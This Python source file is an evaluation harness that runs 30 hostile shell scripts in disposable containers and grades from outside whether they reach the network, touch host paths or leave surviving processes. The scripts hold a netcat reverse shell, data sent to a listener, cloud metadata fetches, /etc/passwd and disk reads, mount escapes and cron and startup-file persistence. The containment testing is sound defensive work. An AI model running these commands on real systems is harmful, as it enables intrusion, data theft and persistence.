"""Claim M5: 30 hostile scripts in a disposable container (#278, ADR 0007).

The frozen case file ``evals/prereg/m5-container-hostile.jsonl`` names 30 things a
hostile script tries: 12 to reach the network, 10 to reach a host path, 8 to outlive
its task. Each case here becomes one script, run once in one container through
``ContainerExecutor`` with the real runtime. The grade comes from outside the
container, never from what the script says about itself:

* network: a listener on this host (TCP and UDP, all interfaces) counts connections,
  and the guest must have no interface besides ``lo``. A script that reports an
  outbound command succeeding also fails the case.
* host path: canary files, a watch folder and the workspace root's other entries are
  hashed before and after; the canary token must not appear in anything the guest
  printed.
* survivor: every script leaves a background process that would write a marker into
  the mounted workspace six seconds later. After the container is removed the runner
  waits, and any marker is a survivor. A control proves the marker works while the
  container is alive.

Limits, stated because the claim is only as strong as its observer: a connection to a
public address cannot be seen from this host, so those cases rest on the guest having
no non-loopback interface, and on the host-visible listener for the cases aimed at it.
"""

from __future__ import annotations

import getpass
import hashlib
import json
import secrets
import shutil
import socket
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from lab.container import (
    AppleContainerRuntime,
    ContainerConfig,
    ContainerExecutor,
    ContainerResult,
    build_list_argv,
)
from lab.prereg import DOC, ROOT, PreregError, load_frozen

M5_CASES = ROOT / "evals" / "prereg" / "m5-container-hostile.jsonl"
NETWORK, HOST, SURVIVOR = "network_blocked", "host_path_blocked", "no_surviving_process"
EXPECTED = {"net": NETWORK, "host": HOST, "survivor": SURVIVOR}
SURVIVOR_DELAY = 6           # seconds a background process waits before it writes its marker
SETTLE_SECONDS = SURVIVOR_DELAY + 3
GUEST_TIMEOUT = 60.0
PUBLIC = "93.184.216.34"


class Observer:
    """Counts what reaches this host: TCP connections and UDP datagrams, any interface."""

    def __init__(self) -> None:
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp.bind(("0.0.0.0", 0))
        self.port = self.tcp.getsockname()[1]
        self.tcp.listen(16)
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.bind(("0.0.0.0", self.port))
        self.seen: list[str] = []
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self._threads = [threading.Thread(target=self._tcp_loop, daemon=True),
                         threading.Thread(target=self._udp_loop, daemon=True)]
        for t in self._threads:
            t.start()

    def _note(self, what: str) -> None:
        with self._lock:
            self.seen.append(what)

    def _tcp_loop(self) -> None:
        self.tcp.settimeout(0.2)
        while not self._stop.is_set():
            try:
                conn, addr = self.tcp.accept()
            except (TimeoutError, OSError):
                continue
            self._note(f"tcp from {addr[0]}")
            conn.close()

    def _udp_loop(self) -> None:
        self.udp.settimeout(0.2)
        while not self._stop.is_set():
            try:
                _, addr = self.udp.recvfrom(2048)
            except (TimeoutError, OSError):
                continue
            self._note(f"udp from {addr[0]}")

    def count(self) -> int:
        with self._lock:
            return len(self.seen)

    def close(self) -> None:
        self._stop.set()
        for s in (self.tcp, self.udp):
            s.close()
        for t in self._threads:
            t.join(2)


def host_address() -> str:
    """This host's address on its default route. A UDP connect sends nothing."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("203.0.113.1", 9))        # TEST-NET-3, never routed
        return str(s.getsockname()[0])
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


# ------------------------------------------------------------------ the scripts


def _out(case_id: str, command: str) -> str:
    return (f"{command}\nrc=$?\necho \"ATTEMPT {case_id} rc=$rc\"\n"
            f"[ \"$rc\" -eq 0 ] && echo \"OUT_OK {case_id}\"\n")


def _later(case_id: str) -> str:
    return f"sleep {SURVIVOR_DELAY}; echo alive > /work/{case_id}"


def network_script(case_id: str, host: str, port: int) -> str:
    """The guest's attempt. Public targets are unobservable from here; see the module doc."""
    n = case_id.rsplit("-", 1)[1]
    target = f"{host} {port}"
    commands = {
        "00": "nslookup example.com 8.8.8.8",
        "01": f"wget -q -T 3 -O- http://{PUBLIC}/",
        "02": f"echo workspace-data | nc -w 3 {target}",
        "03": "wget -q -T 3 -O- http://169.254.169.254/latest/meta-data/",
        "04": f"nc -w 3 {target} </dev/null",
        "05": f"nc -w 3 {target} -e /bin/sh </dev/null",
        "06": f"echo beacon | nc -u -w 2 {target}",
        "07": "ping -c 1 -W 2 1.1.1.1",
        "08": "timeout 10 apk --no-cache add curl",
        "09": "wget -q -T 3 -O- "
              "'https://github.com/octocat/Hello-World.git/info/refs?service=git-upload-pack'",
        "10": f"(nc -l -p 9099 &) ; sleep 1; nc -w 3 127.0.0.1 9099 </dev/null; "
              f"nc -w 3 {target} </dev/null",
        "11": "wget -q -T 3 -O- 'http://[2606:4700:4700::1111]/'",
    }
    return ("#!/bin/sh\necho \"IFACES:$(ls /sys/class/net | tr '\\n' ' ')\"\n"
            + _out(case_id, commands[n]))


def host_script(case_id: str, area: Path, canary: Path) -> str:
    n = case_id.rsplit("-", 1)[1]
    watch = area / "watch"
    commands = {
        "00": "echo pwned >> /etc/m5-pwn; echo pwned >> /private/etc/hosts",
        "01": "ls /Users 2>&1; ls /Users/* 2>&1; cat /Volumes/*/* 2>&1 | head -c 200",
        "02": "echo escaped > /work/../../m5-escape-a; echo escaped > /work/../../../m5-escape-b",
        "03": "cat /work/link-to-canary",
        "04": f"mkdir -p {watch} && echo x > {watch}/m5-abs; cat {canary}",
        "05": "cat /proc/1/cmdline; ps; ls /proc | head -30",
        "06": "ls -l /var/run/docker.sock /run/docker.sock; docker ps",
        "07": "ls /dev/disk* /dev/rdisk*; dd if=/dev/disk0 bs=16 count=1",
        "08": "mount -o remount,rw /work; mkdir -p /tmp/x; mount --bind /work /tmp/x; "
              "mount -t tmpfs none /mnt",
        "09": f"ln {canary} /work/hardlink-a; ln /etc/passwd /work/hardlink-b",
    }
    return f"#!/bin/sh\n{commands[n]}\necho \"HOSTCASE-DONE {case_id}\"\n"


def survivor_script(case_id: str) -> str:
    n = case_id.rsplit("-", 1)[1]
    marker = _later(case_id)
    bodies = {
        "00": f"nohup sh -c '{marker}' >/dev/null 2>&1 &",
        "01": f"( ( sh -c '{marker}' >/dev/null 2>&1 & ) & )",
        "02": f"setsid sh -c '{marker}' >/dev/null 2>&1 &",
        "03": f"( {marker} ) >/dev/null 2>&1 &\n"
              "mkdir -p /etc/crontabs; echo '* * * * * true' > /etc/crontabs/root",
        "04": f"sh -c \"sh -c '{marker}' >/dev/null 2>&1 & exit 0\"",
        "05": ("mkdir -p /etc/local.d; echo 'touch /work/boot' > /etc/local.d/m5.start; "
               "echo 'touch /work/boot' >> /etc/profile\n"
               f"( {marker} ) >/dev/null 2>&1 &"),
        "06": f"( nc -l -p 9100 >/dev/null 2>&1 & {marker} ) >/dev/null 2>&1 &",
        "07": f"( n=0; while :; do sleep 1; n=$((n+1)); [ $n -ge {SURVIVOR_DELAY} ] "
              f"&& {{ echo alive > /work/{case_id}; n=0; }}; done ) >/dev/null 2>&1 &",
    }
    return f"#!/bin/sh\n{bodies[n]}\necho \"STARTED {case_id}\"\n"


# ---------------------------------------------------------------- the grading


@dataclass(frozen=True)
class CaseResult:
    id: str
    category: str
    expected: str
    outcome: str
    failed: bool
    detail: list[str] = field(default_factory=list)


@dataclass(frozen=True)
class M5Report:
    cases_sha256: str
    image: str
    results: list[CaseResult]
    controls: dict[str, bool]
    host_visible: str

    @property
    def failures(self) -> int:
        return sum(r.failed for r in self.results) + sum(not ok for ok in self.controls.values())

    def category(self, name: str) -> list[CaseResult]:
        return [r for r in self.results if r.category == name]


def _digest_tree(path: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    for p in sorted(path.rglob("*")) if path.exists() else []:
        if p.is_symlink():
            out[str(p)] = "link:" + str(p.readlink())
        elif p.is_file():
            out[str(p)] = hashlib.sha256(p.read_bytes()).hexdigest()
        else:
            out[str(p)] = "dir"
    return out


def _stat(path: str) -> tuple[int, int] | None:
    try:
        s = Path(path).stat()
    except OSError:
        return None
    return s.st_size, s.st_mtime_ns


def grade_network(result: ContainerResult, observed: int, case_id: str) -> tuple[bool, list[str]]:
    out = result.stdout
    notes: list[str] = []
    failed = False
    ifaces = next((ln.split(":", 1)[1].split() for ln in out.splitlines()
                   if ln.startswith("IFACES:")), None)
    if ifaces is None:
        failed = True
        notes.append("the guest never reported its interfaces")
    elif set(ifaces) - {"lo"}:
        failed = True
        notes.append(f"the guest has a non-loopback interface: {ifaces}")
    if f"OUT_OK {case_id}" in out:
        failed = True
        notes.append("an outbound command succeeded in the guest")
    if observed:
        failed = True
        notes.append(f"this host saw {observed} connection(s)")
    if f"ATTEMPT {case_id}" not in out:
        failed = True
        notes.append("the attempt did not run to its end")
    if not result.removed:
        failed = True
        notes.append("the container was not removed")
    return failed, notes


def grade_host(result: ContainerResult, before: dict[str, Any], after: dict[str, Any],
               token: str, case_id: str) -> tuple[bool, list[str]]:
    notes: list[str] = []
    failed = False
    if before != after:
        failed = True
        changed = sorted({k for k in set(before) | set(after) if before.get(k) != after.get(k)})
        notes.append(f"host state changed: {changed[:5]}")
    text = result.stdout + result.stderr
    if token in text:
        failed = True
        notes.append("the canary token appeared in the guest's output")
    user = getpass.getuser()
    if user not in ("root", "nobody") and f"/Users/{user}" in text:
        failed = True
        notes.append("the host account's home appeared in the guest's output")
    if "launchd" in text or "WindowServer" in text:
        failed = True
        notes.append("host process names appeared in the guest's output")
    if f"HOSTCASE-DONE {case_id}" not in result.stdout:
        failed = True
        notes.append("the script did not run to its end")
    if not result.removed:
        failed = True
        notes.append("the container was not removed")
    return failed, notes


# ------------------------------------------------------------------ the runner


def _run(executor: ContainerExecutor, workspace: Path, script: str, name: str) -> ContainerResult:
    (workspace / "attempt.sh").write_text(script)
    return executor.run(workspace, ["sh", "/work/attempt.sh"], task_id=name,
                        timeout=GUEST_TIMEOUT)


def _listed(cli: str) -> list[str]:
    out = subprocess.run(build_list_argv(cli), capture_output=True, text=True, timeout=60,
                         check=False)
    return out.stdout.split()


def _snapshot(root: Path, area: Path, ws: Path) -> dict[str, Any]:
    return {"area": _digest_tree(area), "root": sorted(p.name for p in root.iterdir()),
            "hosts": _stat("/etc/hosts"), "passwd": _stat("/etc/passwd"),
            "parent": sorted(p.name for p in root.parent.iterdir()),
            "ws_links": {k: v for k, v in _digest_tree(ws).items() if v.startswith("link:")}}


def _observer_control(observer: Observer, host: str) -> bool:
    """Prove the listener counts: connect to it from here, as a guest would from outside."""
    before = observer.count()
    with socket.create_connection((host, observer.port), timeout=3):
        pass
    time.sleep(0.5)
    return observer.count() == before + 1


def _startup_probe(executor: ContainerExecutor, root: Path) -> tuple[bool, list[str]]:
    """A fresh container must not carry the start-up file case 05 wrote."""
    ws = root / "probe"
    ws.mkdir()
    res = _run(executor, ws, "#!/bin/sh\n[ ! -e /etc/local.d/m5.start ] && "
               "! grep -q m5 /etc/profile && echo PROBE_CLEAN\n", "m5-probe")
    ok = "PROBE_CLEAN" in res.stdout and res.removed
    return ok, ([] if ok else ["a fresh container still carried the start-up file"])


def _marker_control(executor: ContainerExecutor, root: Path) -> bool:
    """A background process does write its marker while the container is alive."""
    ws = root / "control"
    ws.mkdir()
    res = _run(executor, ws, "#!/bin/sh\n( sleep 2; echo alive > /work/ctl ) &\nsleep 5\n",
               "m5-control")
    return res.removed and (ws / "ctl").exists()


def run_m5(image: str, cases: Path = M5_CASES, doc: Path = DOC) -> M5Report:
    digest, rows = load_frozen(cases, doc)
    if len(rows) != 30:
        raise PreregError(f"expected 30 cases, found {len(rows)}")
    runtime = AppleContainerRuntime()
    cli = runtime.cli()
    if cli is None:
        raise PreregError("no container runtime on this host")
    base = Path(tempfile.mkdtemp(prefix="m5-"))
    root = base / "workspaces"
    area = base / "host-area"
    root.mkdir()
    (area / "watch").mkdir(parents=True)
    token = "M5-CANARY-" + secrets.token_hex(12)
    canary = area / "canary.txt"
    canary.write_text(token + "\n")
    observer = Observer()
    host = host_address()
    executor = ContainerExecutor(runtime, root, ContainerConfig(image=image))
    results: list[CaseResult] = []
    markers: list[tuple[str, Path, ContainerResult]] = []
    removed_at = 0.0
    try:
        controls = {"observer_sees_a_connection": _observer_control(observer, host)}
        for row in rows:
            case_id, category = str(row["id"]), str(row["id"]).split("-")[1]
            expected = str(row["expected"])
            if EXPECTED.get(category) != expected:
                raise PreregError(f"{case_id}: unexpected outcome {expected!r}")
            ws = root / case_id
            ws.mkdir()
            if category == "net":
                before_count = observer.count()
                res = _run(executor, ws, network_script(case_id, host, observer.port), case_id)
                time.sleep(0.5)
                failed, notes = grade_network(res, observer.count() - before_count, case_id)
                outcome = "network_open" if failed else NETWORK
            elif category == "host":
                if case_id.endswith("03"):
                    (ws / "link-to-canary").symlink_to(canary)
                before = _snapshot(root, area, ws)
                res = _run(executor, ws, host_script(case_id, area, canary), case_id)
                failed, notes = grade_host(res, before, _snapshot(root, area, ws), token, case_id)
                outcome = "host_touched" if failed else HOST
            else:
                res = _run(executor, ws, survivor_script(case_id), case_id)
                removed_at = time.monotonic()
                markers.append((case_id, ws, res))
                continue
            results.append(CaseResult(case_id, category, expected, outcome, failed, notes))
        # Survivors are graded together: wait once, then look for any marker.
        time.sleep(max(0.0, SETTLE_SECONDS - (time.monotonic() - removed_at)))
        listed = set(_listed(cli))
        for case_id, ws, res in markers:
            notes = []
            failed = False
            if f"STARTED {case_id}" not in res.stdout:
                failed = True
                notes.append("the script did not start its background process")
            if not res.removed or res.name in listed:
                failed = True
                notes.append("the container was not removed")
            if (ws / case_id).exists():
                failed = True
                notes.append("a process from the task wrote its marker after removal")
            results.append(CaseResult(case_id, "survivor", SURVIVOR,
                                      "survivor" if failed else SURVIVOR, failed, notes))
        clean, probe_notes = _startup_probe(executor, root)
        if not clean:
            results = [r if r.id != "m5-survivor-05" else
                       CaseResult(r.id, r.category, r.expected, "survivor", True,
                                  r.detail + probe_notes) for r in results]
        controls["survivor_marker_works_while_alive"] = _marker_control(executor, root)
    finally:
        observer.close()
        shutil.rmtree(base, ignore_errors=True)
    return M5Report(digest, image, results, controls,
                    f"listener on {host}:{observer.port}, TCP and UDP")


def print_report(report: M5Report) -> None:
    for r in report.results:
        print(f"{'FAIL' if r.failed else 'ok  '}  {r.id:<16} {r.outcome}")
        for note in r.detail:
            print(f"        {note}")
    for name, ok in report.controls.items():
        print(f"{'ok  ' if ok else 'FAIL'}  control {name}")
    print(f"\ncases file sha256 {report.cases_sha256} (matches the doc)")
    print(f"image {report.image}\nobserver {report.host_visible}")
    print(f"{len(report.results)} cases, {report.failures} failure(s) (target 0)")
    for name in ("net", "host", "survivor"):
        rows = report.category(name)
        print(f"  {name}: {len(rows)} cases, {sum(r.failed for r in rows)} failure(s)")


def as_json(report: M5Report) -> str:
    return json.dumps({"cases_sha256": report.cases_sha256, "image": report.image,
                       "failures": report.failures, "controls": report.controls,
                       "observer": report.host_visible,
                       "results": [r.__dict__ for r in report.results]}, indent=2)
